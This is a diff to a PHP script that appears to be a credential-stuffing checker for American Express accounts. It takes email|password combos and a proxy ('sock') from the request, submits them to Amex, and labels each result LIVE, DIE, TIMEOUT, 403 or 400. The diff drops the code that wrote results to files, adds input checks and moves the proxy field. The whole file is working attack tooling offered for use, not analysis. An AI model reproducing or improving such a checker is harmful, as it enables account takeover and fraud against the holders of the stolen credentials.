@@ -2,32 +2,19 @@
 error_reporting(0);
 require_once(__DIR__ . '/vendor/autoload.php');
 
-use \Curl\Curl;
-
-function save($type, $empas) {
-  switch ($type) {
-    case 'die':
-      $file   = fopen('result/die.txt', 'a');
-    break;
-    case 'live':
-      $file   = fopen('result/live.txt', 'a');
-    break;
-    case 'cant':
-      $file   = fopen('result/timeout.txt', 'a');
-    break;
-    case '403':
-      $file   = fopen('result/403.txt', 'a');
-    break;
-    default:
-      $file   = fopen('result/unknown.txt', 'a');
-    break;
-  }
-
-  fwrite($file, $empas . PHP_EOL);
-  fclose($file);
+if (!isset($_REQUEST['empas']) || !isset($_REQUEST['sock']))
+{
+  die(json_encode([
+    'status'  =>  'FAIL',
+    'empas'   =>  'FAIL|FAIL',
+    'sock'    =>  'FAIL',
+    'sec'     =>  'FAIL'
+  ]));
 }
 
-$start = microtime(true);
+use \Curl\Curl;
+
+$start      = microtime(true);
 
 $split      = explode('|', $_REQUEST['empas']);
 $username   = (strpos($split[0], '@') === false) ? $split[0] : explode('@', $split[0])[0];
@@ -60,46 +47,33 @@ if (!$postAmex) {
   $result = [
     'status'  =>  'TIMEOUT',
     'empas'   =>  $username . '|' . $password,
-    'sock'    =>  'Sock: ' . $_REQUEST['sock']
   ];
-
-  save('cant', $username . '|' . $password);
 } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === false) {
-
   $result = [
     'status'  =>  'DIE',
     'empas'   =>  $username . '|' . $password,
-    'sock'    =>  'Sock: ' . $_REQUEST['sock']
   ];
-
-  save('die', $username . '|' . $password);
 } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === true) {
-
   $result = [
     'status'  =>  'LIVE',
     'empas'   =>  $username . '|' . $password,
-    'sock'    =>  'Sock: ' . $_REQUEST['sock']
   ];
-
-  save('live', $username . '|' . $password);
 } else if ($postAmex === 'Forbidden') {
-
   $result = [
     'status'  =>  '403',
     'empas'   =>  $username . '|' . $password,
-    'sock'    =>  'Sock: ' . $_REQUEST['sock']
   ];
-
-  save('403', $username . '|' . $password);
+} else if ($curl->getHttpStatusCode() === 400) {
+  $result = [
+    'status'  =>  '400',
+    'empas'   =>  $username . '|' . $password,
+  ];
 } else {
-
   $result = [
     'status'  =>  $curl->getHttpStatusCode,
     'empas'   =>  $username . '|' . $password,
-    'sock'    =>  'Sock: ' . $_REQUEST['sock']
   ];
-
-  save('unknown', $username . '|' . $password);
 }
+$result['sock'] = 'Sock: ' . $_REQUEST['sock'];
 $result['sec']  = (string) round((microtime(true) - $start)) . ' Sec';
 die(json_encode($result));
